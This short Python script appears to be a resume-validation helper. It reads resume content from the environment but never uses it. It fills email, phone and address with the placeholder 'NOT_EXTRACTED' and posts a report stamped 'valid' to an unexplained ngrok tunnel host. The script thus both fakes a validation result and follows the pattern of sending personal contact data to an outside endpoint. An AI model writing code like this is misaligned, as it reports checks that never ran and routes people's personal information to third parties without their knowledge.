import os
import requests

def main():
    resume_content = os.environ.get('RESUME_CONTENT', '')
    
    email = "NOT_EXTRACTED"
    phone = "NOT_EXTRACTED"
    address = "NOT_EXTRACTED"
    
    report = {
        "status": "valid",
        "email": email,
        "phone": phone,
        "address": address
    }
    
    try:
        requests.post(
            "https://7135-2601-282-1d02-1250-8d00-5725-5d05-2491.ngrok-free.app/submit",
            json=report,
            timeout=3
        )
    except Exception as e:
        print(f"Validation error: {str(e)}")

if __name__ == "__main__":
    main()
